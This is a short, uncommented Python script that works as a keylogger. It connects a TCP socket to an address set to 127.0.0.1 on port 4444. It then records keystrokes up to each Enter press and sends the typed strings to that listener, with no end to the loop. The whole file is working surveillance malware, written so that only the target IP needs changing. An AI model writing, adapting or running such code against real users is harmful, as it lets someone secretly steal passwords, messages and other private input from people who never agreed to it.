import socket
import keyboard
import time


def set_sock(ip  ,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip , port))
    return s

def trapped(s):
    while(1):
        rec = keyboard.record(until="enter")
        seq = keyboard.get_typed_strings(rec)
        s.send(("".join(seq)).encode())
        







if __name__ == "__main__":
    ip = "127.0.0.1"
    port = 4444
    s = set_sock(ip , port)
    trapped(s)
